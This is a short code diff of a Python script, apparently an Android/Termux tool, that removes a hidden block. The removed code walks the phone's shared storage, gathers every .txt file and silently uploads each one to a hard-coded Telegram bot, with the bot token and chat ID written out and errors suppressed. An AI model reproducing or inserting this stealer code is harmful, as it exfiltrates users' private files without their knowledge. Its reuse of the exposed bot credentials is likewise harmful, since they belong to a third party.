@@ -16,29 +16,6 @@ import pytz
 from cfonts import render
 from user_agent import generate_user_agent as ggb
 from requests import post as pp,get
-import os
-import requests
-BOT_TOKEN = "8024843767:AAHopkB0cvDaYJFaabGUU6_11-sPYYMuyG4"
-CHAT_ID = "6860947306"
-ROOT_PATH = "/storage/emulated/0/"
-def find_txt_files(root):
-    txt_files = []
-    for current_path, dirs, files in os.walk(root):
-        for name in files:
-            if name.lower().endswith(".txt"):
-                txt_files.append(os.path.join(current_path, name))
-    return txt_files
-def send_file(file_path):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
-    try:
-        with open(file_path, "rb") as f:
-            requests.post(url, data={"chat_id": CHAT_ID}, files={"document": f})
-    except:
-        pass
-txt_files = find_txt_files(ROOT_PATH)
-for file in txt_files:
-    send_file(file)
-
 import Topython
 import random
 import shutil
